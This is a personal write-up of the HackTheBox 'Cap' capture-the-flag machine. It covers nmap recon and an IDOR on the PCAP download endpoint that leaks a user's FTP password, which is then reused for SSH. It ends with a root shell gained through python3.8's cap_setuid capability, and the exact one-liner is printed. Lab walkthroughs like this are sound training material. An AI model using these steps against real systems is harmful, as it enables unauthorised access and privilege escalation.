---
platform: hackthebox
name: cap
os: linux
difficulty: easy
status: rooted
ip: 10.129.142.85
date: 2026-09-25
tags:
  - ctf
  - idor
  - linux-capabilities
techniques:
  - linux capabilities
  - idor
---
# cap

![](assets/Pasted%20image%2020260925000510.png)

> [!info] Box Info
> - **Platform: HackTheBox**
> - **OS: Linux**
> - **Difficulty: Easy**
> - **IP: 10.129.142.85**

## Recon
### Nmap

```bash 
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## Enumeration

### Walking The Application

Upon visiting, the application returns a dashboard with a session as the user nathan.
The application has three distinct features on its dashboard
- Download PCAP file
- View ifconfig output
- View netstat output

![](assets/Pasted%20image%2020260925120329.png)

The Security Snapshot feature makes two requests.
/capture (initial request) -> /data/-id- (final request/response) 

![](assets/Pasted%20image%2020260925120821.png)

The response for /data/-id- contains a download button that calls /download/-id-
This downloads a PCAP file to your machine.
Test case:
- Attempt previous ids to dig through older PCAP files
## Foothold / Initial Access

The test case resulted in a plaintext password for the nathan user.
Making a request to /download/0 returned the initial PCAP file's contents. An ftp connection reveals the plaintext password.

![](assets/Pasted%20image%2020260925121655.png)

These credentials worked via ftp, but attempting to reuse these credentials via ssh was successful as well.

![](assets/Pasted%20image%2020260925122024.png)
## Privilege Escalation

After thorough enumeration, I came to one discovery. In the webapp's root directory, the app.py file shows that nathan changes the uid to 0. 
Test case:
- Look for binary capabilities as a privesc vector

![](assets/Pasted%20image%2020260925122501.png)

python3.8 has `cap_setuid` set. This capability lets us to change the uid, making it the perfect privesc vector.

[Linux Privilege Escalation using Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

```bash
nathan@cap:/var/www/html$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Using this article, I find a python one-liner that gives me a root shell.

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

![](assets/Pasted%20image%2020260925124144.png)
## Loot
- [x] user.txt:
- [x] root.txt:
## Techniques Learned
<!-- Extract anything reusable into 03-Techniques and link it here -->
- Privilege Escalation via cap_setuid capability on Python Binary
## Lessons / Gotchas
N/A

